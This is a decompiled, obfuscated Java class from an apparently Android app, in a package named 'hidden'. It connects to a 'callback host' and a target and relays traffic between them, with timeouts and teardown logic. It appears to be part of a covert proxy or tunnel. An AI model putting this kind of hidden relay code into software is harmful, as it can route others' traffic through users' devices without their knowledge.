package ddth2.hidden;

import java.io.IOException;
import java.net.InetAddress;
import java.net.InetSocketAddress;
import java.net.Socket;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.ScheduledFuture;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.concurrent.atomic.AtomicInteger;

/* JADX INFO: loaded from: classes.dex */
public final class V {
    public final F a;
    public final L b;
    public final long c;
    public final G d;
    public final ScheduledExecutorService e;
    public final ScheduledExecutorService f;
    public final C0011k g;
    public volatile Socket m;
    public volatile Socket n;
    public volatile boolean o;
    public volatile ScheduledFuture p;
    public volatile ScheduledFuture q;
    public volatile long r;
    public final AtomicBoolean h = new AtomicBoolean(false);
    public final AtomicBoolean i = new AtomicBoolean(false);
    public final AtomicBoolean j = new AtomicBoolean(false);
    public final AtomicBoolean k = new AtomicBoolean(false);
    public final AtomicInteger l = new AtomicInteger(0);
    public volatile long s = System.nanoTime();

    public V(F f, L l, long j, G g, ScheduledExecutorService scheduledExecutorService, ScheduledExecutorService scheduledExecutorService2, C0011k c0011k) {
        this.a = f;
        this.b = l;
        this.c = j;
        this.d = g;
        this.e = scheduledExecutorService;
        this.f = scheduledExecutorService2;
        this.g = c0011k;
    }

    public final void a() {
        if (this.j.get() && this.k.get() && this.i.compareAndSet(false, true)) {
            ScheduledFuture scheduledFuture = this.p;
            if (scheduledFuture != null) {
                scheduledFuture.cancel(false);
            }
            long j = this.b.l;
            if (j > 0) {
                this.q = this.e.schedule(new U(this), j, TimeUnit.MILLISECONDS);
            }
            b();
            F f = this.a;
            int activeCount = f.g.getActiveCount();
            int maximumPoolSize = f.g.getMaximumPoolSize();
            int iRemainingCapacity = f.g.getQueue().remainingCapacity();
            if (activeCount + 2 > maximumPoolSize && iRemainingCapacity < 2) {
                b();
                a(4, false);
                return;
            }
            try {
                try {
                    boolean zA = this.a.a(new RunnableC0013m(this.n.getInputStream(), this.m.getOutputStream(), this, true, M.a(this.b.a), "callback_to_target"));
                    try {
                        try {
                            boolean zA2 = this.a.a(new RunnableC0013m(this.m.getInputStream(), this.n.getOutputStream(), this, false, M.a(this.b.a), "target_to_callback"));
                            if (zA && zA2) {
                                b();
                            } else {
                                b();
                                a(4, false);
                            }
                        } catch (Exception e) {
                            throw new IllegalStateException(e);
                        }
                    } catch (Exception e2) {
                        throw new IllegalStateException(e2);
                    }
                } catch (Exception e3) {
                    throw new IllegalStateException(e3);
                }
            } catch (Exception e4) {
                throw new IllegalStateException(e4);
            }
        }
    }

    public final void b() {
        if (this.r != 0) {
            TimeUnit.NANOSECONDS.toMillis(System.nanoTime() - this.r);
        }
        M.a(this.b.a);
        String str = this.b.b;
    }

    public final void a(Socket socket, String str, int i, int i2, boolean z) throws IOException {
        InetSocketAddress inetSocketAddress;
        InetAddress inetAddress;
        socket.setTcpNoDelay(true);
        socket.setKeepAlive(true);
        if (z) {
            inetSocketAddress = new InetSocketAddress(str, i);
        } else {
            InetAddress inetAddressA = P.a(str);
            if (inetAddressA != null) {
                inetSocketAddress = new InetSocketAddress(inetAddressA, i);
            } else {
                throw new IOException("callback host is not an IP literal");
            }
        }
        socket.connect(inetSocketAddress, i2);
        if (z && (inetAddress = socket.getInetAddress()) != null && (inetAddress.isAnyLocalAddress() || inetAddress.isLoopbackAddress() || inetAddress.isLinkLocalAddress() || inetAddress.isSiteLocalAddress() || inetAddress.isMulticastAddress())) {
            z.a(socket);
            throw new O();
        }
        this.s = System.nanoTime();
    }

    public final void a(int i, boolean z) {
        if (this.h.compareAndSet(false, true)) {
            ScheduledFuture scheduledFuture = this.p;
            if (scheduledFuture != null) {
                scheduledFuture.cancel(false);
            }
            ScheduledFuture scheduledFuture2 = this.q;
            if (scheduledFuture2 != null) {
                scheduledFuture2.cancel(false);
            }
            if (z && !this.o && !this.i.get()) {
                String str = this.b.f;
                b();
                G g = this.d;
                L l = this.b;
                g.a(l.f, l.g, l.a, i);
            }
            F f = this.a;
            long j = this.c;
            byte[] bArr = this.b.a;
            f.getClass();
            byte[] bArr2 = new byte[17];
            System.arraycopy(bArr, 0, bArr2, 0, 16);
            bArr2[16] = (byte) i;
            try {
                f.a(j, null, K.a(18, bArr2));
            } catch (IOException unused) {
            }
            z.a(this.m);
            z.a(this.n);
            this.g.e.remove(M.a(this.b.a));
            b();
            M.a(this.b.a);
        }
    }

    public final void a(int i) {
        if (this.h.compareAndSet(false, true)) {
            ScheduledFuture scheduledFuture = this.p;
            if (scheduledFuture != null) {
                scheduledFuture.cancel(false);
            }
            ScheduledFuture scheduledFuture2 = this.q;
            if (scheduledFuture2 != null) {
                scheduledFuture2.cancel(false);
            }
            z.a(this.m);
            z.a(this.n);
            this.g.e.remove(M.a(this.b.a));
            b();
            M.a(this.b.a);
        }
    }
}
